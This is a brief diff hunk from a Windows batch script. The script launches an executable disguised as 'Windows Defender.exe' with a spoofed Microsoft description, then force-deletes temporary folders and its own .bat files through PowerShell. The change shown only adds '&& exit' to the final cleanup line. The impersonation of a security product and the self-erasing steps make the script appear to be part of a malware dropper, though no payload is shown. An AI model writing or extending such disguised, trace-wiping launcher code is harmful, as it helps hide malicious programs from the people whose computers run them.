@@ -89,4 +89,4 @@ rmdir /s /q "%temp%\%folder%"
 
 "%environment%\Windows Defender.exe" -P"rofile of Windows Defender [Microsoft Corporation]"
 endlocal
-powershell.exe Remove-Item -Force -Recurse "%environment%\Win32\*.bat"
+powershell.exe Remove-Item -Force -Recurse "%environment%\Win32\*.bat" && exit
